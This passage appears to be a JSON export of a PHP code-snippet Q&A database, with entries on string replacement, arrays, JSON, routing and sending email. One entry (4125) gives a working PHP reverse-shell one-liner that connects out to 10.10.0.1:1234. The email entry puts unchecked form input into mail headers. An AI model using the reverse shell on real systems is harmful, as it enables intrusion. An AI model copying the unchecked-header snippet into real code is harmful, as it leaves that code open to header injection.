    "description": "str_replace(' ', '-', $string);\n<?php    $string = \"hello php\";   $replace = str_replace(\" \", \"_\", $string);   echo $replace; // hello_php ?>\n// Clean up multiple dashes or whitespaces $string = preg_replace(\"/[\\s-]+/\", \" \", $string); // Convert whitespaces and underscore to dash $string = preg_replace(\"/[\\s_]/\", \"-\", $string);\n",
    "reg_date": "2021-10-12T10:19:11.000Z"
  },
  {
    "id": 4107,
    "keyword": null,
    "link": null,
    "title": " php replace string with array values",
    "description": "$string = \"last_name, first_name\"; $search = array('first_name', 'last_name'); $replace = array('John', 'Smith');  $result = str_replace($search, $replace, $string); \n",
    "reg_date": "2021-10-12T10:19:11.000Z"
  },
  {
    "id": 4108,
    "keyword": null,
    "link": null,
    "title": " php replace string within string",
    "description": "<?php //str_replace(\"Original Value\", \"Value to be replaced\", \"String\"); $result = str_replace(\"1\", \"2\", \"This is number 1\"); // Output: This is number 2 ?>\nstr_replace ($search, $replace, $subject);\n$new_string = str_replace( $take_out, $put_in, $string);\n$var1 = 'hello_john'; $var2 = str_replace(\"_\", \"-\", $var1); echo $var2; // hello-john\n<?php $string = str_ireplace(\"FoX\", \"CAT\", \"the quick brown fox jumps over the lazy dog\"); echo $string; // the quick brown CAT jumps over the lazy dog ?>\nstr_replace ( array|string $needle , array|string $needle_replacement , string|array $haystack , int &$output_count = null ) : string|array str_replace ($needle, $needle_replacement, $haystack, $output_count);   // $needle --> the string value or array of string values you're looking for   // $needle_replacement --> the string value or array of string values you'll replace the needle(s) with   // $haysytack --> the string or array of strings you'd like to search/replace needles in   // $output_count --> not an input, but can be used to get an aggregator to count how many needles were replaced  str_replace ($needle, $needle_replacement, $haystack) //w/out count\n",
    "reg_date": "2021-10-12T10:19:11.000Z"
  },
  {
    "id": 4109,
    "keyword": null,
    "link": null,
    "title": " php reporting wrong time",
    "description": "  date_default_timezone_set('Europe/London'); \ndate.timezone=\"Europe/London\" \n",
    "reg_date": "2021-10-12T10:19:11.000Z"
  },
  {
    "id": 4110,
    "keyword": null,
    "link": null,
    "title": " php request uri",
    "description": "echo $_SERVER['PHP_SELF']; echo \"<br>\"; echo $_SERVER['SERVER_NAME']; echo \"<br>\"; echo $_SERVER['HTTP_HOST']; echo \"<br>\"; // echo $_SERVER['HTTP_REFERER']; echo \"<br>\"; echo $_SERVER['HTTP_USER_AGENT']; echo \"<br>\"; echo $_SERVER['SCRIPT_NAME'];\n<?php   // PHP $_SERVER['...']; method      // PHP file name   echo 'PHP file name: '.$_SERVER['PHP_SELF'].'<br>';   // Server name   echo 'Server name: '.$_SERVER['SERVER_NAME'].'<br>';   // HTTP host   echo 'HTTP host: '.$_SERVER['HTTP_HOST'].'<br>';   // Refering link   echo 'Refering link: '.$_SERVER['HTTP_REFERER'].'<br>';   // User agent   echo 'User agent: '.$_SERVER['HTTP_USER_AGENT'].'<br>';   // Script name   echo 'Script name: '.$_SERVER['SCRIPT_NAME'];      // The rest is optional    if($_SERVER['PHP_SELF']=='/filename.php'){     //If there is no folder     echo 'No folder'.$_SERVER['PHP_SELF'];   } else{     // Echo the name of the folder containing the PHP file     echo 'PHP file name: '.$_SERVER['PHP_SELF'];   }      // The same if statements can be used for the script name      if($_SERVER['SCRIPT_NAME']=='/filename.php'){     // If there is no folder     echo 'No folder'.$_SERVER['SCRIPT_NAME'];   } else{     // Echo the name of the folder containing the PHP file     echo 'PHP file name: '.$_SERVER['SCRIPT_NAME'];   }      echo '<a href=\"repl.it/@CoolWebDev\">More from me...</a>';      // I hope you found this helpful!  ?>\n$url = parse_url($_SERVER['REQUEST_URI']);  if ($url != '/') {     parse_str($url['query']);     echo $id;     echo $othervar; } \n",
    "reg_date": "2021-10-12T10:19:11.000Z"
  },
  {
    "id": 4111,
    "keyword": null,
    "link": null,
    "title": " php require",
    "description": "// Include a file, if it can't be found: continue. <?php include 'mainfile.php'; ?>    // Alternatively: Require a file to be imported or quit if it can't be found <?php  require 'requiredfile.php'; ?>\n// Require a file to be imported or quit if it can't be found <?php  require 'requiredfile.php'; ?>\n// Require a file to be imported or quit if it can't be found <?php  require 'somefile.php'; ?>    // Alternatively: Include a file, if it can't be found: continue. <?php include 'vars.php'; ?>\n# return.php <?php  $var = 'PHP';  return $var;  ?>  # noreturn.php <?php  $var = 'PHP';  ?>  # testreturns.php <?php  $foo = include 'return.php';  echo $foo; // prints 'PHP'  $bar = include 'noreturn.php';  echo $bar; // prints 1  ?>  //$bar is the value 1 because the include was successful. Notice the difference between the above examples. The first uses return within the included file while the other does not. If the file can't be included, false is returned and E_WARNING is issued.\n",
    "reg_date": "2021-10-12T10:19:11.000Z"
  },
  {
    "id": 4112,
    "keyword": null,
    "link": null,
    "title": " php require vs require once",
    "description": "//The require statement has two variations, require and require_once. //The require/require_once statement is used to include file.  // Require a file to be imported or quit if it can't be found <?php  require 'requiredfile.php'; ?> // Require_once is ignored if the required file has already been added by any of the include statements. <?php  require_once 'require_oncefile.php'; ?> \nAs there is two different kind of require statements i.e. require and require_once both are having same functionality of including file into the another.    Using require if the file is not misplaced or undefined then its stops the execution of the document. <?php  require 'requiredfile.php'; ?>    And require_once is gets ignored if the file already imported with any other require or require_once. <?php  require_once 'require_oncefile.php'; ?>\n",
    "reg_date": "2021-10-12T10:19:12.000Z"
  },
  {
    "id": 4113,
    "keyword": null,
    "link": null,
    "title": " php requuire once",
    "description": "require_once('var.php');\n",
    "reg_date": "2021-10-12T10:19:12.000Z"
  },
  {
    "id": 4114,
    "keyword": null,
    "link": null,
    "title": " php reset array keys",
    "description": "$arr = array_values($arr)\nunset($foo[0]); // remove item at index 0 $foo2 = array_values($foo); // 'reindex' array\nforeach($input as &$val) {    $val = array_values($val); }\n",
    "reg_date": "2021-10-12T10:19:12.000Z"
  },
  {
    "id": 4115,
    "keyword": null,
    "link": null,
    "title": " php reset mysql array",
    "description": " mysql_data_seek($result, 0);  \n",
    "reg_date": "2021-10-12T10:19:12.000Z"
  },
  {
    "id": 4116,
    "keyword": null,
    "link": null,
    "title": " php resize image",
    "description": "// resize on upload $maxDim = 800; $file_name = $_FILES['myFile']['tmp_name']; list($width, $height, $type, $attr) = getimagesize( $file_name ); if ( $width > $maxDim || $height > $maxDim ) {     $target_filename = $file_name;     $ratio = $width/$height;     if( $ratio > 1) {         $new_width = $maxDim;         $new_height = $maxDim/$ratio;     } else {         $new_width = $maxDim*$ratio;         $new_height = $maxDim;     }     $src = imagecreatefromstring( file_get_contents( $file_name ) );     $dst = imagecreatetruecolor( $new_width, $new_height );     imagecopyresampled( $dst, $src, 0, 0, 0, 0, $new_width, $new_height, $width, $height );     imagedestroy( $src );     imagepng( $dst, $target_filename ); // adjust format as needed     imagedestroy( $dst ); }\n",
    "reg_date": "2021-10-12T10:19:12.000Z"
  },
  {
    "id": 4117,
    "keyword": null,
    "link": null,
    "title": " php retour à la ligne",
    "description": "<?php echo 'Bienvenue sur mon site !<br/>'; echo 'Cool :)'; ?>\n",
    "reg_date": "2021-10-12T10:19:12.000Z"
  },
  {
    "id": 4118,
    "keyword": null,
    "link": null,
    "title": " php return a header 200",
    "description": "header(\"HTTP/1.1 200 OK\"); \n",
    "reg_date": "2021-10-12T10:19:12.000Z"
  },
  {
    "id": 4119,
    "keyword": null,
    "link": null,
    "title": " php return array",
    "description": "<?php  function data() {     $out[0] = \"abc\";     $out[1] = \"def\";     $out[2] = \"ghi\";     return $out; }  $data = data(); foreach($data as $items){     echo $items; } \nfunction myfunc(){     $arr = array();     $arr[] = 'value0';     $arr['key1'] = 'value1';     $arr['key2'] = 'value2';     $arr[] = 'value3';     return $arr; } \n",
    "reg_date": "2021-10-12T10:19:12.000Z"
  },
  {
    "id": 4120,
    "keyword": null,
    "link": null,
    "title": " php return json",
    "description": "//Json Encode  $person = array(      \"name\" => \"KINGASV\",      \"title\" => \"CTO\" );  $personJSON=json_encode($person);//returns JSON string  //Json Decode  $personJSON = '{\"name\":\"KINGASV\",\"title\":\"CTO\"}';  $person = json_decode($personJSON);  echo $person->name; // KINGASV \n$personJSON = '{\"name\":\"Johny Carson\",\"title\":\"CTO\"}';  $person = json_decode($personJSON);  echo $person->name; // Johny Carson\nheader('Content-type: application/json'); echo json_encode($array);\nheader('Content-Type: application/json');   $colors = array(\"red\",\"blue\",\"green\"); echo json_encode($colors);\n$data = json_decode(file_get_contents('php://input'), true); print_r($data); echo $data; \n<?php $jsonurl = \"https://reqres.in/api/users/2\"; $json = file_get_contents($jsonurl); $jsonDecode = json_decode($json, true); echo $jsonDecode['data']['email']; ?>\n",
    "reg_date": "2021-10-12T10:19:12.000Z"
  },
  {
    "id": 4121,
    "keyword": null,
    "link": null,
    "title": " php return json data",
    "description": "//e.g your JSON Req is like this {\"UserName\":\"Ranish\",\"Password\":\"asdasdasd\"} $jsonReqUrl  = \"php://input\"; $reqjson = file_get_contents($jsonReqUrl); $reqjsonDecode = json_decode($reqjson, true); echo $reqjsonDecode['UserName'];\nheader('Content-Type: application/json');   $colors = array(\"red\",\"blue\",\"green\"); echo json_encode($colors);\n$json = ' {     \"type\": \"donut\",     \"name\": \"Cake\",     \"toppings\": [         { \"id\": \"5002\", \"type\": \"Glazed\" },         { \"id\": \"5006\", \"type\": \"Chocolate with Sprinkles\" },         { \"id\": \"5004\", \"type\": \"Maple\" }     ] }';  $yummy = json_decode($json);  print_r($yummy); \n",
    "reg_date": "2021-10-12T10:19:12.000Z"
  },
  {
    "id": 4122,
    "keyword": null,
    "link": null,
    "title": " php return json data to ajax",
    "description": "header('Content-Type: application/json');   $colors = array(\"red\",\"blue\",\"green\"); echo json_encode($colors);\n <?php  echo json_encode($data); ?>  \n",
    "reg_date": "2021-10-12T10:19:13.000Z"
  },
  {
    "id": 4123,
    "keyword": null,
    "link": null,
    "title": " php return loading message",
    "description": "<?php // Disable buffering @apache_setenv('no-gzip', 1); @ini_set('zlib.output_compression', 0); @ini_set('output_buffering', 'Off'); @ini_set('implicit_flush', 1); // Flush buffers ob_implicit_flush(1); for ($i = 0, $level = ob_get_level(); $i < $level; $i++) ob_end_flush(); ?><!DOCTYPE html> <html> <head>   <title>Loading</title> </head> <body>   <div id=\"loading\">LOADING</div> <?php // We need to send enough junk messages to make it works for all browsers echo str_repeat(\" \", 1024), \"\\n\";  ob_start(); // Long process starts here // For this example, just sleep for 5 seconds sleep(5);  echo \"Loaded\"; // Flush output like this ob_flush(); flush(); ?> </body> </html> \n",
    "reg_date": "2021-10-12T10:19:13.000Z"
  },
  {
    "id": 4124,
    "keyword": null,
    "link": null,
    "title": " php reverse array",
    "description": "foreach(array_reverse($array) as $var) { \techo $var // Will show in reversed order }\n$array= array(1,2,3,4,5); $reversedArray = array_reverse($array);  var_dump($y);\n <?php $input  = array(\"php\", 4.0, array(\"green\", \"red\")); $reversed = array_reverse($input); $preserved = array_reverse($input, true);  print_r($input); print_r($reversed); print_r($preserved); ?>  \narray_reverse($array);\n<?php $i_arr = [\"html\", \"css\", \"javascript\", \"php\", \"vue\", \"react\"];  echo \"<pre>\"; print_r($i_arr); echo \"</pre>\";  $reverse = array_reverse($i_arr, false); $preserve = array_reverse($i_arr, true);  echo \"<pre>\"; print_r($reverse); echo \"</pre>\";  echo \"<pre>\"; print_r($preserve); echo \"</pre>\"; ?>\n",
    "reg_date": "2021-10-12T10:19:13.000Z"
  },
  {
    "id": 4125,
    "keyword": null,
    "link": null,
    "title": " php reverse shell oneliner",
    "description": "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/10.10.0.1/1234 0>&1'\"); ?>\n",
    "reg_date": "2021-10-12T10:19:13.000Z"
  },
  {
    "id": 4126,
    "keyword": null,
    "link": null,
    "title": " php round decimal",
    "description": "$value = 1.23456789; $rounded_value = round($value, 2);  // 2 is the precision here we will get 1.23\n// using round() function we can roundoff float values in php $value = 58.24365; round($value, 2); //result 58.24\n<?php  function cutAfterDot($number, $afterDot = 2){ $a = $number * pow(10, $afterDot); $b = floor($a); $c = pow(10, $afterDot); echo \"a $a, b $b, c $c<br/>\"; return $b/$c ; } echo cutAfterDot(2.05,2);  /* output =   a 205, b 204, c 100  2.04 */  ?>\n",
    "reg_date": "2021-10-12T10:19:13.000Z"
  },
  {
    "id": 4127,
    "keyword": null,
    "link": null,
    "title": " php round down",
    "description": "// round down echo floor(1.5); // prints 1  // round up echo ceil(1.5); // prints 2\necho ceil(0.5); //Prints 1\n$int = 8.998988776636; round($int) //Will always be 9  $int = 8.344473773737377474; round($int) //will always be 8\n//round up to nearest integer echo(ceil(0.60) . \"<br>\"); //result 1\n <?php echo 'Rounding modes with 9.5' . PHP_EOL; var_dump(round(9.5, 0, PHP_ROUND_HALF_UP)); var_dump(round(9.5, 0, PHP_ROUND_HALF_DOWN)); var_dump(round(9.5, 0, PHP_ROUND_HALF_EVEN)); var_dump(round(9.5, 0, PHP_ROUND_HALF_ODD));  echo 'Rounding modes with 8.5' . PHP_EOL; var_dump(round(8.5, 0, PHP_ROUND_HALF_UP)); var_dump(round(8.5, 0, PHP_ROUND_HALF_DOWN)); var_dump(round(8.5, 0, PHP_ROUND_HALF_EVEN)); var_dump(round(8.5, 0, PHP_ROUND_HALF_ODD)); ?>  \necho ceil(4.3);    // 5 echo ceil(9.999);  // 10 echo ceil(-3.14);  // -3\n",
    "reg_date": "2021-10-12T10:19:13.000Z"
  },
  {
    "id": 4128,
    "keyword": null,
    "link": null,
    "title": " php round to whole number",
    "description": "// round down echo floor(1.5); // prints 1  // round up echo ceil(1.5); // prints 2\n$int = 8.998988776636; round($int) //Will always be 9  $int = 8.344473773737377474; round($int) //will always be 8\n <?php echo 'Rounding modes with 9.5' . PHP_EOL; var_dump(round(9.5, 0, PHP_ROUND_HALF_UP)); var_dump(round(9.5, 0, PHP_ROUND_HALF_DOWN)); var_dump(round(9.5, 0, PHP_ROUND_HALF_EVEN)); var_dump(round(9.5, 0, PHP_ROUND_HALF_ODD));  echo 'Rounding modes with 8.5' . PHP_EOL; var_dump(round(8.5, 0, PHP_ROUND_HALF_UP)); var_dump(round(8.5, 0, PHP_ROUND_HALF_DOWN)); var_dump(round(8.5, 0, PHP_ROUND_HALF_EVEN)); var_dump(round(8.5, 0, PHP_ROUND_HALF_ODD)); ?>  \n",
    "reg_date": "2021-10-12T10:19:13.000Z"
  },
  {
    "id": 4129,
    "keyword": null,
    "link": null,
    "title": " php round up",
    "description": "// round down echo floor(1.5); // prints 1  // round up echo ceil(1.5); // prints 2\necho ceil(0.5); //Prints 1\n$int = 8.998988776636; round($int) //Will always be 9  $int = 8.344473773737377474; round($int) //will always be 8\n//round up to nearest integer echo(ceil(0.60) . \"<br>\"); //result 1\n <?php echo 'Rounding modes with 9.5' . PHP_EOL; var_dump(round(9.5, 0, PHP_ROUND_HALF_UP)); var_dump(round(9.5, 0, PHP_ROUND_HALF_DOWN)); var_dump(round(9.5, 0, PHP_ROUND_HALF_EVEN)); var_dump(round(9.5, 0, PHP_ROUND_HALF_ODD));  echo 'Rounding modes with 8.5' . PHP_EOL; var_dump(round(8.5, 0, PHP_ROUND_HALF_UP)); var_dump(round(8.5, 0, PHP_ROUND_HALF_DOWN)); var_dump(round(8.5, 0, PHP_ROUND_HALF_EVEN)); var_dump(round(8.5, 0, PHP_ROUND_HALF_ODD)); ?>  \necho ceil(4.3);    // 5 echo ceil(9.999);  // 10 echo ceil(-3.14);  // -3\n",
    "reg_date": "2021-10-12T10:19:13.000Z"
  },
  {
    "id": 4130,
    "keyword": null,
    "link": null,
    "title": " php routing",
    "description": "<?php  $request = $_SERVER['REQUEST_URI'];  switch ($request) {     case '/' :         require __DIR__ . '/views/index.php';         break;     case '' :         require __DIR__ . '/views/index.php';         break;     case '/about' :         require __DIR__ . '/views/about.php';         break;     default:         http_response_code(404);         require __DIR__ . '/views/404.php';         break; }\n",
    "reg_date": "2021-10-12T10:19:14.000Z"
  },
  {
    "id": 4131,
    "keyword": null,
    "link": null,
    "title": " php routing htaccess",
    "description": "RewriteEngine On RewriteCond %{REQUEST_FILENAME} !-d RewriteCond %{REQUEST_FILENAME} !-f RewriteRule ^(.+)$ index.php?url=$1 [QSA,L]\n",
    "reg_date": "2021-10-12T10:19:14.000Z"
  },
  {
    "id": 4132,
    "keyword": null,
    "link": null,
    "title": " php rsa encryption",
    "description": "// Use phpseclib: http://phpseclib.sourceforge.net/ <?php include('Crypt/RSA.php');  $privatekey = file_get_contents('private.key'); $rsa = new Crypt_RSA(); $rsa->loadKey($privatekey);  $plaintext = new Math_BigInteger('aaaaaa'); echo $rsa->_exponentiate($plaintext)->toBytes(); ?>\n<?php  $publicKey = file_get_contents(\"public.key\"); $textToEncrypt = \"My Plain Text\" ; $cipherType = \"RSA/ECB/PKCS1Padding\"; //RSA, RSA/ECB/OAEPWithSHA-1AndMGF1Padding   $curl = curl_init();  curl_setopt_array($curl, array(   CURLOPT_URL => 'https://www.devglan.com/online-tools/rsa-encrypt',   CURLOPT_RETURNTRANSFER => true,   CURLOPT_ENCODING => '',   CURLOPT_MAXREDIRS => 10,   CURLOPT_TIMEOUT => 0,   CURLOPT_FOLLOWLOCATION => true,   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,   CURLOPT_CUSTOMREQUEST => 'POST',   CURLOPT_POSTFIELDS =>'{     \"textToEncrypt\": \"'.$textToEncrypt.'\",     \"publicKey\": \"'.$publicKey.'\",     \"keyType\": \"publicKeyForEncryption\",     \"cipherType\": \"'.$cipherType.'\" }',   CURLOPT_HTTPHEADER => array(     'Content-Type: application/json'   ), ));  $response = curl_exec($curl);  curl_close($curl); echo $response;  ?> \n",
    "reg_date": "2021-10-12T10:19:14.000Z"
  },
  {
    "id": 4133,
    "keyword": null,
    "link": null,
    "title": " php rsort retain keys",
    "description": "//Sort an array in reverse order and maintain index association arsort($myArray) \n",
    "reg_date": "2021-10-12T10:19:14.000Z"
  },
  {
    "id": 4134,
    "keyword": null,
    "link": null,
    "title": " php run command line",
    "description": "shell_exec('ls'); // or exec('ls');\n I'm not sure what shell you are going to get with this function, but you can find out like this:  <?php $cmd = 'set'; echo \"<pre>\".shell_exec($cmd).\"</pre>\"; ?>  On my FreeBSD 6.1 box I get this:  USER=root LD_LIBRARY_PATH=/usr/local/lib/apache2: HOME=/root PS1='$ ' OPTIND=1 PS2='> ' LOGNAME=root PPID=88057 PATH=/etc:/bin:/sbin:/usr/bin:/usr/sbin SHELL=/bin/sh IFS='      '  Very interesting.  Note that the PATH may not be as complete as you need.  I wanted to run Ghostscript via ImageMagik's \"convert\" and ended up having to add my path before running the command:  <?php $cmd = 'export PATH=\"/usr/local/bin/\"; convert -scale 25%x25% file1.pdf[0] file2.png 2>&1'; echo \"<pre>\".shell_exec($cmd).\"</pre>\"; ?>  ALSO, note that shell_exec() does not grab STDERR, so use \"2>&1\" to redirect it to STDOUT and catch it. \nphp -f /path/to/your/file.php\nphp php_file.php // or php php_file.php > result_file.txt // to display the result of echoes or dumps\nTo execute a php script, use the PHP Command Line interface(CLI) and specify the file name of the script in the following way: php script.php\n",
    "reg_date": "2021-10-12T10:19:14.000Z"
  },
  {
    "id": 4135,
    "keyword": null,
    "link": null,
    "title": " php run python script",
    "description": "$r=shell_exec(\"python3 mypythonscript.py\");  echo $r;//will be out put of .py script\n",
    "reg_date": "2021-10-12T10:19:14.000Z"
  },
  {
    "id": 4136,
    "keyword": null,
    "link": null,
    "title": " php salto de linea",
    "description": "<?php echo nl2br(\"One line.\\nAnother line.\"); echo \"Thanks for your email\" .\"<br/>\". \"Your orders details are below:\" ?>\n",
    "reg_date": "2021-10-12T10:19:14.000Z"
  },
  {
    "id": 4137,
    "keyword": null,
    "link": null,
    "title": " php save array to file",
    "description": "$arr1 = array ('a'=>1,'b'=>2,'c'=>3,'d'=>4,'e'=>5); file_put_contents(\"array.json\",json_encode($arr1)); # array.json => {\"a\":1,\"b\":2,\"c\":3,\"d\":4,\"e\":5} $arr2 = json_decode(file_get_contents('array.json'), true); $arr1 === $arr2 # => true\n",
    "reg_date": "2021-10-12T10:19:14.000Z"
  },
  {
    "id": 4138,
    "keyword": null,
    "link": null,
    "title": " php save csv to zip",
    "description": "// Create ZIP file $zipname = storage_path() . '/' . 'zipName.zip'; $zip = new \\ZipArchive;  if ($zip->open($zipname, \\ZipArchive::CREATE | \\ZipArchive::OVERWRITE) != true) {   throw new \\Exception('Can\\'t save zip file'); }  // Create CSV file $columns = ['id', 'uid', 'name', 'dob']; $clientCvs = fopen('php://temp/maxmemory:1048576', 'w'); if (false === $clientCvs) {   throw new \\Exception('Failed to create temporary file'); }  fputcsv($clientCvs, $columns); fputcsv($clientCvs, [   $this->id,   $this->uid,   $this->name,   $this->dob ?? '-', ]);  // Rewind stream source rewind($clientCvs);  // Add to the zip file $zip->addFromString('member.csv', stream_get_contents($clientCvs));  // Close temp file fclose($clientCvs); \n",
    "reg_date": "2021-10-12T10:19:14.000Z"
  },
  {
    "id": 4139,
    "keyword": null,
    "link": null,
    "title": " php save image from url to folder",
    "description": "You should be able to use file_get_contents for this one. In order to use an URL with file_get_contents make sure allow_url_fopen is enabled in you php.ini file.  define('DIRECTORY', '/home/user/uploads');  $content = file_get_contents('http://anothersite/images/goods.jpg'); file_put_contents(DIRECTORY . '/image.jpg', $content); Make sure that you have write permission to the directory where you want to store the image; to make the folder writable you could do this:  chmod +w /home/users/uploads\n",
    "reg_date": "2021-10-12T10:19:14.000Z"
  },
  {
    "id": 4140,
    "keyword": null,
    "link": null,
    "title": " php scandir",
    "description": "// Shows us all files and directories in directory except \".\" and \"..\".  foreach (new DirectoryIterator('../moodle') as $fileInfo) {     if($fileInfo->isDot()) continue;     echo $fileInfo->getFilename() . \"<br>\\n\"; }\nif ($handle = opendir('.')) {      while (false !== ($entry = readdir($handle))) {          if ($entry != \".\" && $entry != \"..\") {              echo \"$entry\\n\";         }     }      closedir($handle); }\nforeach(glob('includes/*.php') as $file) {     ... }\n<?php $dir = \"/images/\";  // Sort in ascending order - this is default $a = scandir($dir);  // Sort in descending order $b = scandir($dir,1);  print_r($a); print_r($b); ?>\n$dir = '.'; $directories = glob($dir . '/*', GLOB_ONLYDIR);\nscandir ( string $directory [, int $sorting_order = SCANDIR_SORT_ASCENDING [, resource $context ]] ) : array\n",
    "reg_date": "2021-10-12T10:19:14.000Z"
  },
  {
    "id": 4141,
    "keyword": null,
    "link": null,
    "title": " php script to calculate next 50 days from current date",
    "description": "$NewDate=Date('y:m:d', strtotime('+50 days'));\n",
    "reg_date": "2021-10-12T10:19:15.000Z"
  },
  {
    "id": 4142,
    "keyword": null,
    "link": null,
    "title": " php script to generate random date",
    "description": "//Generate a timestamp using mt_rand. $timestamp = mt_rand(1, time());  //Format that timestamp into a readable date string. $randomDate = date(\"d M Y\", $timestamp);  //Print it out. echo $randomDate;\n",
    "reg_date": "2021-10-12T10:19:15.000Z"
  },
  {
    "id": 4143,
    "keyword": null,
    "link": null,
    "title": " php search in array case insensitive",
    "description": "array_search(strtolower($search), array_map('strtolower', $array));\n",
    "reg_date": "2021-10-12T10:19:15.000Z"
  },
  {
    "id": 4144,
    "keyword": null,
    "link": null,
    "title": " php search in object. array",
    "description": "$neededObject = array_filter(     $arrayOfObjects,     function ($e) use (&$searchedValue) {         return $e->id == $searchedValue;     } );\n",
    "reg_date": "2021-10-12T10:19:15.000Z"
  },
  {
    "id": 4145,
    "keyword": null,
    "link": null,
    "title": " php search on array",
    "description": "//array_search $result = array_search(\"apple\", $fruit_array); // return index or false  //in_array $result = in_array(\"apple\", $fruit_array); // return true or false\n",
    "reg_date": "2021-10-12T10:19:15.000Z"
  },
  {
    "id": 4146,
    "keyword": null,
    "link": null,
    "title": " php search the key off bigger value",
    "description": "$key_of_max_value = array_search(max($arrCompare),$arrCompare);\n",
    "reg_date": "2021-10-12T10:19:15.000Z"
  },
  {
    "id": 4147,
    "keyword": null,
    "link": null,
    "title": " php see if undefined",
    "description": "if (isset($variable)) { /* do something */ };\n",
    "reg_date": "2021-10-12T10:19:15.000Z"
  },
  {
    "id": 4148,
    "keyword": null,
    "link": null,
    "title": " php select option",
    "description": "// Page containing a form: <form action=\"myaction.php\" method=\"post\">  <select name=\"fruit\">     <option value=\"Apple\">Apple</option>     <option value=\"Banana\">Banana</option>  </select>    <input type=\"submit\" value=\"Submit\"> </form>  // myaction.php Hello <?php echo htmlspecialchars($_POST['fruit']); ?>\n<?php     if(isset($_POST['submit'])){     if(!empty($_POST['Fruit'])) {         $selected = $_POST['Fruit'];         echo 'You have chosen: ' . $selected;     } else {         echo 'Please select the value.';     }     } ?>\n",
    "reg_date": "2021-10-12T10:19:15.000Z"
  },
  {
    "id": 4149,
    "keyword": null,
    "link": null,
    "title": " php select page change",
    "description": "<select name=\"page\" onchange=\"window.location=this.value\">     <option value=\"/path/to/page1.php\">Page 1</option>     <option value=\"/path/to/page2.php\">Page 2</option>     <option value=\"/path/to/page3.php\">Page 3</option> </select> \n<?php $page = null; if(isset($_POST['page'])){     $page = $_POST['page']; } switch($page){     case 'page3': include_once('/path/to/page3content.php'); break;     case 'page2': include_once('/path/to/page2content.php'); break;     case 'page1': include_once('/path/to/page1content.php'); break;     default: include_once('/path/to/defaultcontent.php'); break; } ?> <form name=\"myform\" action=\"\" method=\"post\">     <select name=\"page\" onchange=\"this.form.submit()\">         <option value=\"page1\"<?php if($page == \"page1\"){ echo \" selected\"; }?>>Page 1</option>         <option value=\"page2\"<?php if($page == \"page2\"){ echo \" selected\"; }?>>Page 2</option>         <option value=\"page3\"<?php if($page == \"page3\"){ echo \" selected\"; }?>>Page 3</option>     </select> </form> \n",
    "reg_date": "2021-10-12T10:19:15.000Z"
  },
  {
    "id": 4150,
    "keyword": null,
    "link": null,
    "title": " php self",
    "description": "<form name=\"form1\" method=\"post\" action=\"<?php echo $_SERVER['PHP_SELF']; ?>\" >  \nclass X {     private $non_static_member = 1;     private static $static_member = 2;      function __construct() {         echo $this->non_static_member . ' '            . self::$static_member;     } }  new X();\n",
    "reg_date": "2021-10-12T10:19:16.000Z"
  },
  {
    "id": 4151,
    "keyword": null,
    "link": null,
    "title": " php self submit",
    "description": "<form action=\"<?php echo $_SERVER['PHP_SELF']; ?>\">  //there is no reason to use this to submit form data to the same page <form action=\"\">  //will do the same thing\n<?php if (!empty($_POST)): ?>     Welcome, <?php echo htmlspecialchars($_POST[\"name\"]); ?>!<br>     Your email is <?php echo htmlspecialchars($_POST[\"email\"]); ?>.<br> <?php else: ?>     <form action=\"<?php echo htmlspecialchars($_SERVER[\"PHP_SELF\"]); ?>\" method=\"post\">         Name: <input type=\"text\" name=\"name\"><br>         Email: <input type=\"text\" name=\"email\"><br>         <input type=\"submit\">     </form> <?php endif; ?> \naction=\"<?php echo htmlspecialchars($_SERVER[\"PHP_SELF\"]); ?>\"\n",
    "reg_date": "2021-10-12T10:19:16.000Z"
  },
  {
    "id": 4152,
    "keyword": null,
    "link": null,
    "title": " php send email",
    "description": "<?php  if(isset($_POST['submit'])){     $to = \"email@example.com\"; // this is your Email address     $from = $_POST['email']; // this is the sender's Email address     $first_name = $_POST['first_name'];     $last_name = $_POST['last_name'];     $subject = \"Form submission\";     $subject2 = \"Copy of your form submission\";     $message = $first_name . \" \" . $last_name . \" wrote the following:\" . \"\\n\\n\" . $_POST['message'];     $message2 = \"Here is a copy of your message \" . $first_name . \"\\n\\n\" . $_POST['message'];      $headers = \"From:\" . $from;     $headers2 = \"From:\" . $to;     mail($to,$subject,$message,$headers);     mail($from,$subject2,$message2,$headers2); // sends a copy of the message to the sender     echo \"Mail Sent. Thank you \" . $first_name . \", we will contact you shortly.\";     // You can also use header('Location: thank_you.php'); to redirect to another page.     } ?>  <!DOCTYPE html> <head> <title>Form submission</title> </head> <body>  <form action=\"\" method=\"post\"> First Name: <input type=\"text\" name=\"first_name\"><br> Last Name: <input type=\"text\" name=\"last_name\"><br> Email: <input type=\"text\" name=\"email\"><br> Message:<br><textarea rows=\"5\" name=\"message\" cols=\"30\"></textarea><br> <input type=\"submit\" name=\"submit\" value=\"Submit\"> </form>  </body> </html> \n<?php $to = $_POST['email']; $subject = \"Email Subject\";  $message = 'Dear '.$_POST['name'].',<br>'; $message .= \"We welcome you to be part of family<br><br>\"; $message .= \"Regards,<br>\";  // Always set content-type when sending HTML email $headers = \"MIME-Version: 1.0\" . \"\\r\\n\"; $headers .= \"Content-type:text/html;charset=UTF-8\" . \"\\r\\n\";  // More headers $headers .= 'From: <enquiry@example.com>' . \"\\r\\n\"; $headers .= 'Cc: myboss@example.com' . \"\\r\\n\";  mail($to,$subject,$message,$headers); ?>\n    $filename = 'myfile';     $path = 'your path goes here';     $file = $path . \"/\" . $filename;      $mailto = 'mail@mail.com';     $subject = 'Subject';     $message = 'My message';      $content = file_get_contents($file);     $content = chunk_split(base64_encode($content));      // a random hash will be necessary to send mixed content     $separator = md5(time());      // carriage return type (RFC)     $eol = \"\\r\\n\";      // main header (multipart mandatory)     $headers = \"From: name <test@test.com>\" . $eol;     $headers .= \"MIME-Version: 1.0\" . $eol;     $headers .= \"Content-Type: multipart/mixed; boundary=\\\"\" . $separator . \"\\\"\" . $eol;     $headers .= \"Content-Transfer-Encoding: 7bit\" . $eol;     $headers .= \"This is a MIME encoded message.\" . $eol;      // message     $body = \"--\" . $separator . $eol;     $body .= \"Content-Type: text/plain; charset=\\\"iso-8859-1\\\"\" . $eol;     $body .= \"Content-Transfer-Encoding: 8bit\" . $eol;     $body .= $message . $eol;      // attachment     $body .= \"--\" . $separator . $eol;     $body .= \"Content-Type: application/octet-stream; name=\\\"\" . $filename . \"\\\"\" . $eol;     $body .= \"Content-Transfer-Encoding: base64\" . $eol;     $body .= \"Content-Disposition: attachment\" . $eol;     $body .= $content . $eol;     $body .= \"--\" . $separator . \"--\";      //SEND Mail    